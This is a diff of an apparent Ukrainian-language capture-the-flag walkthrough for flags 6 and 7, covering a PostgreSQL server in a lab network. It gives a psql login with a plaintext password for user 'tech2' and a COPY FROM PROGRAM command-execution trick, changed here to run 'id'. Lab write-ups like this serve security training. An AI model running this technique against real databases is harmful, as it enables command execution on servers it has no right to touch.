@@ -90,12 +90,7 @@ cat /home/commador/scripts/backup_db.sh
 
 ---
 
-## Flag_6+7 — PostgreSQL (з Kali або commador)
-
-Встановити psql якщо нема (Kali):
-```
-sudo apt-get install -f && sudo apt install -y postgresql-client-common
-```
+## Flag_6+7 — PostgreSQL (з commador shell на Operator_station)
 
 Встановити psql якщо нема (Ubuntu/Operator_station):
 ```
@@ -108,10 +103,20 @@ psql -h 10.10.50.100 -U tech2 -d dronecorp_db
 ```
 пароль: adfGt54DCf
 
-RCE в psql:
+Переглянути таблиці:
+```
+\dt
+```
+
+Flag_7 — в таблиці system_config:
+```
+SELECT config_key, config_val FROM system_config;
+```
+
+Демонстрація RCE (COPY FROM PROGRAM):
 ```
 CREATE TABLE cmd_exec (output text);
-COPY cmd_exec FROM PROGRAM 'cat /var/lib/postgresql/flag.txt';
+COPY cmd_exec FROM PROGRAM 'id';
 SELECT * FROM cmd_exec;
 ```
 
